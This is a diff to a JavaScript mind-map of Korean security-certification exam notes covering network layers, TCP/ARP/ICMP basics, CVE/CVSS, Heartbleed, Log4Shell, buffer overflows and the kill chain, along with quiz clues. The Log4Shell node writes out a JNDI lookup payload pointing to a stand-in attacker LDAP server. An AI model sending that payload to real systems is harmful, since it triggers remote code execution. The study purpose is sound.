@@ -172,46 +172,9 @@ var TREE=n("center","정보보안기사 실기",["과목 → 교재 장 → 개�
   n("s1c2","2장 취약점 점검",["계정·파일·서비스 설정 점검."])
  ]),
  n("s2","2과목 네트워크 보안",["TCP/IP 정상 동작 → 공격 → 보안 기술 → 장비 설정 점검."],[
-  n("s2c1","1장 네트워크 일반",["모든 공격은 이 정상 동작을 속이거나 과부하를 일으킨다."],[
-   n("base","TCP/IP 기초",["모든 공격은 이 정상 동작을 속이거나 과부하를 일으킨다.","정상 동작을 알면 공격이 이해된다."],[
-    n("layer","계층과 데이터 단위",["보낼 때 계층을 내려가며 헤더를 한 겹씩 씌운다(캡슐화). 받을 때는 바깥부터 벗긴다.","[MAC 헤더 [IP 헤더 [TCP 헤더 [데이터]]]]"],[
-     n("l1","1계층 물리 · 비트",["0과 1을 전기·빛·전파 신호로 바꿔 보낸다."]),
-     n("l2","2계층 데이터링크 · 프레임",["MAC 주소가 붙는다.","스위치는 이 계층(MAC 주소)까지만 본다."]),
-     n("l3","3계층 네트워크 · 패킷",["IP 주소가 붙는다.","라우터는 이 계층(IP 주소)까지 본다."]),
-     n("l4","4계층 전송 · 세그먼트/데이터그램",["포트 번호, SEQ·ACK 번호가 붙는다.","TCP 단위는 세그먼트, UDP 단위는 데이터그램."]),
-     n("frag","프래그먼트 (IP 단편화)",["패킷이 MTU(이더넷은 보통 1500바이트)보다 크면 3계층에서 여러 조각으로 나눈다.","받는 쪽은 Fragment Offset을 보고 조각을 다시 합친다.","계층의 데이터 단위가 아니라, 패킷을 나눈 조각이다."],[],1)
-    ],1),
-    n("tcpudp","TCP와 UDP",["4계층(전송 계층)의 두 전송 방식."],[
-     n("tcp","TCP",["연결을 먼저 맺고, 순서를 맞추고, 빠진 데이터는 다시 보낸다.","예: 웹, 이메일."]),
-     n("udp","UDP",["연결 없이 데이터그램을 하나씩 보낸다.","순서 보장·재전송·발신자 확인이 없어서 출발지 위조가 쉽다. 그래서 반사 공격에 쓰인다.","예: DNS, SNMP, NTP, 영상 통화."],[],1)
-    ],1),
-    n("tcpconn","TCP 연결",["TCP가 연결을 맺고 번호를 맞추는 방법."],[
-     n("3way","3-Way Handshake",["SYN → SYN+ACK → ACK.","서버의 SYN+ACK는 \"네 번호 받았음(ACK)\"과 \"내 시작 번호(SYN)\"를 한 번에 보낸 것이다.","열린 포트는 SYN+ACK, 닫힌 포트는 RST+ACK로 응답한다."],[],1),
-     n("seq","SEQ · ACK 번호",["SEQ: 보내는 쪽 자신의 번호.","ACK: 상대가 보낸 번호 + 1 (다음에 받을 번호).","예: 클라이언트 SEQ 4551 → 서버 SEQ 7311·ACK 4552 → 클라이언트 SEQ 4552·ACK 7312.","표를 볼 때는 보내는 쪽부터 확인한다."],[],1),
-     n("flags","TCP 플래그",["SYN 연결 요청, ACK 수신 확인, FIN 정상 종료, RST 강제 종료, PSH 즉시 전달, URG 긴급."])
-    ]),
-    n("addr","주소 찾기",["IP 주소와 MAC 주소를 서로 알아내는 프로토콜."],[
-     n("arp","ARP",["IP 주소로 MAC 주소를 알아낸다."],[
-      n("arpreq","ARP Request",["목적지 MAC을 FF:FF:FF:FF:FF:FF(브로드캐스트)로 보내 네트워크 전체에 묻는다.","상대 MAC을 모르고, 2계층은 목적지 MAC 없이 프레임을 보낼 수 없기 때문이다."],[],1),
-      n("arprep","ARP Reply",["찾는 IP를 가진 장비만 자기 MAC 주소로 답한다."]),
-      n("arpcache","ARP 캐시 테이블",["알아낸 IP–MAC 쌍을 저장하는 표.","ARP 스푸핑이 이 표를 바꾼다."])
-     ],1),
-     n("rarp","RARP",["ARP의 반대. MAC 주소로 IP 주소를 알아낸다.","하드디스크가 없는 장비나 네트워크로 부팅하는 장비가 사용한다."],[],1)
-    ]),
-    n("icmpg","ICMP",["네트워크 상태를 확인하고 오류를 알리는 3계층 프로토콜."],[
-     n("echo","Echo Request · Reply",["ping이 쓰는 메시지.","Echo Request로 묻고 Echo Reply로 답한다."]),
-     n("dbcast","Directed Broadcast",["외부 네트워크에서 특정 네트워크 전체로 보내는 브로드캐스트.","철자 주의: Directed."],[],1)
-    ]),
-    n("httpg","HTTP 규칙",["웹 공격이 악용하는 HTTP의 기본 규칙."],[
-     n("crlf","CRLF",["줄바꿈 문자. CR(0D)은 줄 맨 앞으로, LF(0A)는 다음 줄로.","두 번 연속(0D0A0D0A)이면 HTTP 헤더가 끝난다."],[],1),
-     n("clte","본문 끝 판단",["요청 본문이 어디서 끝나는지 알리는 두 방식."],[
-      n("cl","Content-Length",["본문 전체 길이를 미리 알린다."]),
-      n("chunked","Transfer-Encoding: chunked",["조각마다 크기를 적고, 크기 0인 조각으로 끝을 알린다."])
-     ],1),
-     n("cookie","쿠키 자동 전송",["브라우저는 요청의 목적지 도메인에 맞는 쿠키를 자동으로 붙인다. 요청을 만든 페이지가 어디인지는 보지 않는다.","SameSite 속성: Strict는 다른 사이트 요청에 붙이지 않음, Lax는 링크 이동에만 붙임, None은 항상 붙임."],[],1)
-    ])
-   ]),
-   n("lan","LAN · 장비 관리",["같은 네트워크 안의 장비가 프레임을 주고받고, 관리자가 장비를 감시하는 방법."],[
+  n("s2c1","1장 네트워크 일반",["정상 동작을 계층별로 정리. 모든 공격은 이 정상 동작을 속이거나 과부하를 일으킨다.","보낼 때 계층을 내려가며 헤더를 한 겹씩 씌운다(캡슐화). 받을 때는 바깥부터 벗긴다: [MAC 헤더 [IP 헤더 [TCP 헤더 [데이터]]]]"],[
+   n("l1","1계층 물리",["데이터 단위: 비트.","0과 1을 전기·빛·전파 신호로 바꿔 보낸다.","장비: 허브, 리피터 (받은 신호를 모든 포트로 그대로 보낸다)."]),
+   n("l2","2계층 데이터링크",["데이터 단위: 프레임. MAC 주소가 붙는다.","장비: 스위치, 브리지 (MAC 주소까지만 본다).","이 계층을 노리는 공격: Switch Jamming, ARP 스푸핑."],[
     n("swmode","스위치 전송 방식",["스위치가 프레임을 어느 시점에 내보내는지로 나뉜다.","빠를수록 오류 검사가 적다."],[
      n("cut","Cut Through",["목적지 MAC 주소만 읽고 바로 내보낸다.","가장 빠르지만, 오류가 있는 프레임도 그대로 보낸다."]),
      n("ffree","Fragment Free",["프레임의 앞 64바이트까지 받고 내보낸다.","충돌로 깨진 짧은 프레임(64바이트 미만)을 걸러 낸다. 속도와 정확성이 중간."]),
@@ -233,6 +196,20 @@ var TREE=n("center","정보보안기사 실기",["과목 → 교재 장 → 개�
       n("vproto","프로토콜 기반",["같은 통신 프로토콜끼리 통신하도록 구성한다."])
      ],1)
     ]),
+    n("arp","ARP",["IP 주소로 MAC 주소를 알아낸다.","교재에 따라 3계층으로 보기도 한다. 이 지도는 MAC 주소를 다루므로 2계층에 둔다."],[
+     n("arpreq","ARP Request",["목적지 MAC을 FF:FF:FF:FF:FF:FF(브로드캐스트)로 보내 네트워크 전체에 묻는다.","상대 MAC을 모르고, 2계층은 목적지 MAC 없이 프레임을 보낼 수 없기 때문이다."],[],1),
+     n("arprep","ARP Reply",["찾는 IP를 가진 장비만 자기 MAC 주소로 답한다."]),
+     n("arpcache","ARP 캐시 테이블",["알아낸 IP–MAC 쌍을 저장하는 표.","ARP 스푸핑이 이 표를 바꾼다."])
+    ],1),
+    n("rarp","RARP",["ARP의 반대. MAC 주소로 IP 주소를 알아낸다.","하드디스크가 없는 장비나 네트워크로 부팅하는 장비가 사용한다."],[],1),
+    n("promisc","Promiscuous Mode",["네트워크 카드가 자기에게 오지 않은 프레임까지 받는 모드.","스니핑에 쓰이고, NIDS도 이 모드로 패킷을 수집한다."])
+   ]),
+   n("l3","3계층 네트워크",["데이터 단위: 패킷. IP 주소가 붙는다.","장비: 라우터 (IP 주소까지 본다).","이 계층을 노리는 공격: Smurf, Land, Teardrop. 이 계층 보안: IPSec."],[
+    n("frag","프래그먼트 (IP 단편화)",["패킷이 MTU(이더넷은 보통 1500바이트)보다 크면 3계층에서 여러 조각으로 나눈다.","받는 쪽은 Fragment Offset을 보고 조각을 다시 합친다.","계층의 데이터 단위가 아니라, 패킷을 나눈 조각이다."],[],1),
+    n("icmpg","ICMP",["네트워크 상태를 확인하고 오류를 알리는 3계층 프로토콜."],[
+     n("echo","Echo Request · Reply",["ping이 쓰는 메시지.","Echo Request로 묻고 Echo Reply로 답한다."]),
+     n("dbcast","Directed Broadcast",["외부 네트워크에서 특정 네트워크 전체로 보내는 브로드캐스트.","철자 주의: Directed."],[],1)
+    ]),
     n("routing","라우팅 프로토콜",["라우터(3계층)끼리 목적지까지 가는 길 정보를 주고받는 규칙.","AS 안에서 쓰는지, AS 사이에서 쓰는지로 나뉜다."],[
      n("as","AS (자율 시스템)",["Autonomous System. 한 기관이 직접 관리하는 네트워크 덩어리.","예: KT 네트워크, 큰 대학·회사 네트워크. 고유 AS 번호를 받는다.","인터넷은 수많은 AS가 연결된 것이다."]),
      n("igp","내부 (IGP)",["Interior Gateway Protocol. AS 안에서 길을 찾는다."],[
@@ -243,8 +220,24 @@ var TREE=n("center","정보보안기사 실기",["과목 → 교재 장 → 개�
      n("egp","외부 (EGP)",["Exterior Gateway Protocol. AS와 AS 사이에서 길을 찾는다."],[
       n("bgp","BGP",["Border Gateway Protocol.","예: KT와 SK 네트워크가 서로 길 정보를 주고받을 때 쓴다."])
      ])
-    ],1),
-    n("promisc","Promiscuous Mode",["네트워크 카드가 자기에게 오지 않은 프레임까지 받는 모드.","스니핑에 쓰이고, NIDS도 이 모드로 패킷을 수집한다."]),
+    ],1)
+   ]),
+   n("l4","4계층 전송",["데이터 단위: TCP는 세그먼트, UDP는 데이터그램.","포트 번호, SEQ·ACK 번호가 붙는다.","이 계층을 노리는 공격: SYN Flooding, 포트 스캔, 세션 하이재킹."],[
+    n("tcp","TCP",["연결을 먼저 맺고, 순서를 맞추고, 빠진 데이터는 다시 보낸다.","예: 웹, 이메일."]),
+    n("udp","UDP",["연결 없이 데이터그램을 하나씩 보낸다.","순서 보장·재전송·발신자 확인이 없어서 출발지 위조가 쉽다. 그래서 반사 공격에 쓰인다.","예: DNS, SNMP, NTP, 영상 통화."],[],1),
+    n("3way","3-Way Handshake",["SYN → SYN+ACK → ACK.","서버의 SYN+ACK는 \"네 번호 받았음(ACK)\"과 \"내 시작 번호(SYN)\"를 한 번에 보낸 것이다.","열린 포트는 SYN+ACK, 닫힌 포트는 RST+ACK로 응답한다."],[],1),
+    n("seq","SEQ · ACK 번호",["SEQ: 보내는 쪽 자신의 번호.","ACK: 상대가 보낸 번호 + 1 (다음에 받을 번호).","예: 클라이언트 SEQ 4551 → 서버 SEQ 7311·ACK 4552 → 클라이언트 SEQ 4552·ACK 7312.","표를 볼 때는 보내는 쪽부터 확인한다."],[],1),
+    n("flags","TCP 플래그",["SYN 연결 요청, ACK 수신 확인, FIN 정상 종료, RST 강제 종료, PSH 즉시 전달, URG 긴급."])
+   ]),
+   n("l7","5~7계층 응용",["데이터 단위: 메시지(데이터).","사용자가 쓰는 서비스: HTTP, DNS, FTP, SMTP, SNMP 등.","DNS·FTP는 3과목 1장에 있다(점선 연결)."],[
+    n("httpg","HTTP 규칙",["웹 공격이 악용하는 HTTP의 기본 규칙."],[
+     n("crlf","CRLF",["줄바꿈 문자. CR(0D)은 줄 맨 앞으로, LF(0A)는 다음 줄로.","두 번 연속(0D0A0D0A)이면 HTTP 헤더가 끝난다."],[],1),
+     n("clte","본문 끝 판단",["요청 본문이 어디서 끝나는지 알리는 두 방식."],[
+      n("cl","Content-Length",["본문 전체 길이를 미리 알린다."]),
+      n("chunked","Transfer-Encoding: chunked",["조각마다 크기를 적고, 크기 0인 조각으로 끝을 알린다."])
+     ],1),
+     n("cookie","쿠키 자동 전송",["브라우저는 요청의 목적지 도메인에 맞는 쿠키를 자동으로 붙인다. 요청을 만든 페이지가 어디인지는 보지 않는다.","SameSite 속성: Strict는 다른 사이트 요청에 붙이지 않음, Lax는 링크 이동에만 붙임, None은 항상 붙임."],[],1)
+    ]),
     n("snmp","SNMP",["네트워크 장비의 상태를 감시하고 설정을 관리하는 프로토콜."],[
      n("snmpcomp","구성 요소",["Manager: 장비를 감시하는 관리 서버.","Agent: 장비 안에서 정보를 제공하는 프로그램.","MIB: 장비 정보를 담은 데이터베이스."]),
      n("polling","폴링 · UDP 161",["Manager가 Agent에게 정보를 요청한다.","Agent가 UDP 161번으로 받는다."],[],1),
@@ -444,13 +437,20 @@ var TREE=n("center","정보보안기사 실기",["과목 → 교재 장 → 개�
    ])
   ]),
   n("s3c2","2장 애플리케이션 보안 취약점",["취약점을 부르는 이름과 관리 방법."],[
-  n("cve","CVE",["Common Vulnerabilities and Exposures. 공개된 취약점에 붙는 고유 번호(4회).","형식: CVE-연도-번호. 예: CVE-2014-6271 (Shellshock).","연도 = 취약점이 등록(번호를 받은) 해, 번호 = 그 해의 일련번호(4자리 이상).","미국 MITRE가 운영. 같은 취약점을 전 세계가 같은 이름으로 부르기 위한 것."],[],1),
-  n("cvss","CVSS",["17회. Common Vulnerability Scoring System = 취약점 점수 체계.","CVE가 번호(이름)라면 CVSS는 심각도 점수(0~10, 10이 가장 심각).","기본(Base): 취약점 자체의 위험도. 시간(Temporal): 공격 코드·패치 여부처럼 시간에 따라 바뀜. 환경(Environmental): 우리 회사 환경에서의 중요도."],[],1),
-  n("heartbleed","하트블리드 (Heartbleed)",["23회. CVE-2014-0160. OpenSSL의 Heartbeat 확장 취약점.","정상: 클라이언트가 \"bird(4글자)\"를 보내면 서버가 그대로 \"bird\"를 돌려줌(연결 살아 있니? 확인).","공격: \"bird(500글자)\"라고 길이를 속임 → 서버가 길이를 검증하지 않고 메모리에서 500글자를 읽어 돌려줌 → 비밀번호·쿠키·개인키까지 떨어져 나옴(최대 64KB).","대응: OpenSSL 패치(1.0.1g 이상), 인증서 재발급."],[],1),
-  n("log4j","Log4j · Log4Shell",["24회. Log4j = 아파치의 자바 로깅 라이브러리. 취약점 이름은 Log4Shell(CVE-2021-44228, CVSS 10.0).","정상: 로그 문자열 안의 ${...}를 편의 기능으로 해석해 값을 채워 넣는다(Lookup).","공격: User-Agent 등 로그에 남을 값에 ${jndi:ldap://공격자서버/a} 입력 → 로그를 남기는 순간 JNDI가 공격자 LDAP 서버에서 자바 클래스를 받아 실행 → 원격 코드 실행(RCE).","대응: Log4j 2.17 이상으로 업데이트, JNDI Lookup 비활성화."],[],1),
-  n("poodle","POODLE",["15회. Padding Oracle On Downgraded Legacy Encryption.","중간자가 TLS 연결을 일부러 실패시켜 SSL 3.0으로 내려가게(다운그레이드) 한 뒤, CBC 패딩 검사의 빈틈을 이용해 암호문을 한 바이트씩 풀어낸다(쿠키 탈취).","패딩 오라클: 서버가 패딩이 맞는지 아닌지 대답해 주는 것을 힌트로 삼는 공격.","대응: SSL 3.0 비활성화, TLS_FALLBACK_SCSV(다운그레이드 차단)."],[],1)
- ]),
-  n("s3c3","3장 시스템 공격 기법",["버퍼 오버플로 등. 아직 안 풀었다."]),
+   n("cve","CVE",["Common Vulnerabilities and Exposures. 공개된 취약점에 붙는 고유 번호(4회).","형식: CVE-연도-번호. 예: CVE-2014-6271 (Shellshock).","연도 = 취약점이 등록(번호를 받은) 해, 번호 = 그 해의 일련번호(4자리 이상).","미국 MITRE가 운영. 같은 취약점을 전 세계가 같은 이름으로 부르기 위한 것."],[],1),
+   n("cvss","CVSS",["17회. Common Vulnerability Scoring System = 취약점 점수 체계.","CVE가 번호(이름)라면 CVSS는 심각도 점수(0~10, 10이 가장 심각).","기본(Base): 취약점 자체의 위험도. 시간(Temporal): 공격 코드·패치 여부처럼 시간에 따라 바뀜. 환경(Environmental): 우리 회사 환경에서의 중요도."],[],1),
+   n("heartbleed","하트블리드 (Heartbleed)",["23회. CVE-2014-0160. OpenSSL의 Heartbeat 확장 취약점.","정상: 클라이언트가 \"bird(4글자)\"를 보내면 서버가 그대로 \"bird\"를 돌려줌(연결 살아 있니? 확인).","공격: \"bird(500글자)\"라고 길이를 속임 → 서버가 길이를 검증하지 않고 메모리에서 500글자를 읽어 돌려줌 → 비밀번호·쿠키·개인키까지 떨어져 나옴(최대 64KB).","대응: OpenSSL 패치(1.0.1g 이상), 인증서 재발급."],[],1),
+   n("log4j","Log4j · Log4Shell",["24회. Log4j = 아파치의 자바 로깅 라이브러리. 취약점 이름은 Log4Shell(CVE-2021-44228, CVSS 10.0).","정상: 로그 문자열 안의 ${...}를 편의 기능으로 해석해 값을 채워 넣는다(Lookup).","공격: User-Agent 등 로그에 남을 값에 ${jndi:ldap://공격자서버/a} 입력 → 로그를 남기는 순간 JNDI가 공격자 LDAP 서버에서 자바 클래스를 받아 실행 → 원격 코드 실행(RCE).","대응: Log4j 2.17 이상으로 업데이트, JNDI Lookup 비활성화."],[],1),
+   n("poodle","POODLE",["15회. Padding Oracle On Downgraded Legacy Encryption.","중간자가 TLS 연결을 일부러 실패시켜 SSL 3.0으로 내려가게(다운그레이드) 한 뒤, CBC 패딩 검사의 빈틈을 이용해 암호문을 한 바이트씩 풀어낸다(쿠키 탈취).","패딩 오라클: 서버가 패딩이 맞는지 아닌지 대답해 주는 것을 힌트로 삼는 공격.","대응: SSL 3.0 비활성화, TLS_FALLBACK_SCSV(다운그레이드 차단)."],[],1)
+  ]),
+  n("s3c3","3장 시스템 공격 기법",["메모리를 넘치게 하거나 권한을 빼앗는 공격."],[
+   n("memarea","메모리 영역 (9회)",["프로그램이 실행되면 메모리를 용도별로 나눠 쓴다."],[
+    n("stack","스택 (Stack)",["함수 호출 때 생기는 지역 변수·매개변수와 복귀 주소(Return Address)를 저장. 함수가 끝나면 자동 소멸.","스택 버퍼 오버플로의 무대: 지역 배열이 넘쳐 복귀 주소를 덮는다."]),
+    n("heap","힙 (Heap)",["malloc·new로 동적 할당한 메모리. free·delete로 해제할 때 소멸.","힙 버퍼 오버플로의 무대."])
+   ]),
+   n("bof","버퍼 오버플로 (Buffer Overflow)",["4회. 정상: char p[4]에는 4바이트만 들어간다.","공격: strcpy는 길이를 검사하지 않고 끝(\\0)까지 복사 → 넘친 데이터가 옆의 메모리와 함수 복귀 주소(Return Address)를 덮어씁 → 함수가 끝날 때 공격자 코드로 점프.","취약 함수: strcpy, strcat, gets, sprintf, scanf(%s). 안전 함수: strncpy, strncat, fgets, snprintf.","보호 기법: 스택 가드(카나리 값), ASLR(주소 무작위화), NX·DEP(데이터 영역 실행 금지)."]),
+   n("killchain","사이버 킬 체인 (Cyber Kill Chain)",["7회. 록히드 마틴이 군사 개념을 가져와 APT 공격 과정을 7단계로 나눈 분석 모델.","정찰 → 무기화 → 전달 → 익스플로잇 → 설치 → 명령 및 제어(C&C) → 목표 달성.","핵심: 사슬이라 어느 한 단계만 끊어도 공격이 완성되지 않는다 → 단계별로 막을 수단을 준비한다."])
+  ]),
   n("s3c4","4장 취약점 점검",["웹 서버·쿠키 설정 점검."],[
    n("cookiesess","쿠키 · 세션",["HTTP는 요청마다 사용자를 기억하지 못한다. 그래서 로그인 상태를 이어 가는 표시가 필요하다.","세션 ID를 담은 쿠키 = 로그인 출입증. 훔치면 비밀번호 없이 그 사람으로 로그인된다."],[
     n("ckflow","로그인 흐름",["로그인 → 서버가 세션을 만들어 저장 → Set-Cookie로 세션 ID 전달 → 브라우저가 쿠키로 저장 → 이후 요청마다 Cookie 헤더로 자동 전송."]),
@@ -490,19 +490,10 @@ var TREE=n("center","정보보안기사 실기",["과목 → 교재 장 → 개�
 ]);
 var LEFT=['s2','s5','s6'];
 
-var LINKS=[['3way','synflood'],['3way','half'],['3way','open'],['3way','seq'],['3way','rtt'],['seq','hijack'],['seq','ah'],
- ['arpcache','arpspoof'],['arpreq','l2'],['rarp','arp'],['arpspoof','jamming'],['jamming','swmode'],['jamming','promisc'],['l2','swmode'],
- ['echo','smurf'],['dbcast','smurf'],['smurf','land'],['frag','teardrop'],['l3','ipsec'],['l4','tcpudp'],
- ['crlf','slowloris'],['crlf','split'],['clte','smuggle'],['cookie','csrf'],['csrf','xss'],['csrf','ssrf'],
- ['udp','dtls'],['udp','reflect'],['udp','snmp'],['snmp','siem'],['syslog','siem'],['snmp','syslog'],['promisc','nids'],
- ['slowloris','rudy'],['rudy','slowread'],['idsmodel','ips'],['esm','siem'],['siem','soar'],['flags','stealth'],['flags','half'],
- ['esp','vpnipsec'],['tls','dtls'],
- ['learning','jamming'],['flooding','jamming'],['swfunc','swmode'],['vlanwhy','arpreq'],['routing','l3'],['eigrp','frag'],
- ['cookie','cookiesess'],['httponly','xsssteal'],['xsssteal','xss'],['samesite','csrf'],['secure','tls'],['hijack','cookiesess'],['v3time','ah'],
- ['xss','webshell'],['fupload','webshell'],['fupload','fileinc'],['sqli','oscmd'],['webproxy','proxy'],['csrf','ssrf'],
- ['bounce','active'],['spfdkim','zone'],['hostsfile','tcpwrap'],['dnsspoof','dnscache'],['subtake','zone'],['authns','zone'],['infer','infctl'],['poodle','tls'],['cvss','cve'],['heartbleed','tls'],['log4j','cvss'],['log4j','inject'],['dga','dns'],['aggr','infer'],['cachens','dnscache'],['dnsspoof','arpspoof'],['hostsfile','dnscache'],['dnscache','dnsamp'],['udp','dns'],['apachelog','webetc']];
+var LINKS=[['3way','synflood'],['3way','half'],['3way','open'],['3way','seq'],['3way','rtt'],['seq','hijack'],['seq','ah'],['arpcache','arpspoof'],['arpreq','l2'],['rarp','arp'],['arpspoof','jamming'],['jamming','swmode'],['jamming','promisc'],['l2','swmode'],['echo','smurf'],['dbcast','smurf'],['smurf','land'],['frag','teardrop'],['l3','ipsec'],['crlf','slowloris'],['crlf','split'],['clte','smuggle'],['cookie','csrf'],['csrf','xss'],['csrf','ssrf'],['udp','dtls'],['udp','reflect'],['udp','snmp'],['snmp','siem'],['syslog','siem'],['snmp','syslog'],['promisc','nids'],['slowloris','rudy'],['rudy','slowread'],['idsmodel','ips'],['esm','siem'],['siem','soar'],['flags','stealth'],['flags','half'],['esp','vpnipsec'],['tls','dtls'],['learning','jamming'],['flooding','jamming'],['swfunc','swmode'],['vlanwhy','arpreq'],['routing','l3'],['eigrp','frag'],['cookie','cookiesess'],['httponly','xsssteal'],['xsssteal','xss'],['samesite','csrf'],['secure','tls'],['hijack','cookiesess'],['v3time','ah'],['xss','webshell'],['fupload','webshell'],['fupload','fileinc'],['sqli','oscmd'],['webproxy','proxy'],['csrf','ssrf'],['bounce','active'],['spfdkim','zone'],['hostsfile','tcpwrap'],['dnsspoof','dnscache'],['subtake','zone'],['authns','zone'],['infer','infctl'],['poodle','tls'],['cvss','cve'],['heartbleed','tls'],['log4j','cvss'],['killchain','dga'],['stack','bof'],['log4j','inject'],['dga','dns'],['aggr','infer'],['cachens','dnscache'],['dnsspoof','arpspoof'],['hostsfile','dnscache'],['dnscache','dnsamp'],['udp','dns'],['apachelog','webetc'],['l7','dns'],['l7','ftp'],['tls','l4'],['l2','jamming'],['l2','arpspoof'],['l3','smurf'],['l3','teardrop'],['l4','synflood'],['l4','scan']];
 
 var CLUES={
+l7:"HTTP·DNS·FTP·SNMP처럼 사용자가 쓰는 서비스 프로토콜이 동작하는 계층들과 데이터 단위는?",
 l1:"0과 1을 전기·빛·전파 신호로 보내는 계층과 그 데이터 단위는?",
 l2:"MAC 주소가 붙고 스위치가 보는 계층과 그 데이터 단위는?",
 l3:"IP 주소가 붙고 라우터가 보는 계층과 그 데이터 단위는?",
@@ -637,6 +628,10 @@ expires:"쿠키의 만료 시간을 정하는 속성은?",
 samesite:"다른 사이트에서 시작된 요청에 쿠키를 붙일지 정해 CSRF를 막는 속성은?",
 xsssteal:"게시판에 쿠키 탈취 가능 여부를 점검할 때 넣는 스크립트 한 줄은?",
 xst:"TRACE 메서드가 요청을 그대로 돌려주는 점을 이용해 HttpOnly 쿠키를 읽는 공격은?",
+killchain:"록히드 마틴이 군사 개념을 적용해, APT 공격을 정찰·무기화·전달·익스플로잇·설치·명령 및 제어·목표 달성 7단계로 나눈 모델은?",
+stack:"함수 호출 때 지역 변수·매개변수·복귀 주소가 저장되고, 함수가 끝나면 소멸하는 메모리 영역은?",
+heap:"malloc·new로 동적 할당한 메모리가 저장되고, 해제할 때 소멸하는 메모리 영역은?",
+bof:"C 코드에서 char p[4]에 외부 입력(argv[1])을 길이 검사 없이 복사할 때 생기는 취약점과, 그런 취약 함수 예시는?",
 cktamper:"쿠키에 role=user 같은 권한 값을 담았을 때 사용자가 바꿔 권한을 올리는 공격과 대응은?",
 ips:"침입을 탐지만 하는 IDS와 달리, 탐지하고 차단까지 하는 장비는?",
 te_te:"Request Smuggling에서 둘 다 chunked를 지원하지만, 헤더를 변형해 한쪽이 chunked를 무시하게 만드는 유형은?",
